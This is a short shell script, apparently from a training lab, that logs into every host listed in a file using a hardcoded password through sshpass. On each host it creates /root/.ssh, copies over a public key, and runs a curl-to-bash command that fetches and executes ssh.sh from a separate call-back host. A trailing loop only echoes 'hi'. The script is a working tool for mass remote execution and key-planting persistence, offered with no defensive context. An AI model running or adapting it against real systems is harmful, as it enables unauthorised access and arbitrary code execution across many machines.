password="student"
callip="192.168.56.128"
theport=8000
for device in `cat linuxips.txt`; do
	echo $device
	sshpass -p $password ssh -f ${device} "if [ ! -d /root/.ssh ]; then mkdir /root/.ssh; fi"
	sshpass -p $password scp /root/.ssh/id_rsa.pub ${device}:~/tmp
	sshpass -p $password ssh -f ${device} "curl http://${callip}:${theport}/ssh.sh | /bin/bash" &
done
for device in `cat device-list.txt`; do
	echo hi;	
done
